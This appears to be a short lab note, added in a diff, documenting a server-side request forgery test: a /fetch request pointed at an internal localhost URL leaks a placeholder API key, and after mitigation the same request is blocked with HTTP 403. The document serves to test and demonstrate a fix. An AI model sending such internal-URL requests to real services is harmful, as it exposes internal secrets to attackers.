@@ -1,0 +1,10 @@
+SSRF Proof:
+
+Request:
+ /fetch?url=http://127.0.0.1:5001/internal/secret
+
+Result:
+ {"secret":"INTERNAL_API_KEY_ABC123","impact":"If this is reachable via SSRF, the lab worked"}
+
+After mitigation:
+ HTTP 403 - Blocked by SSRF protection
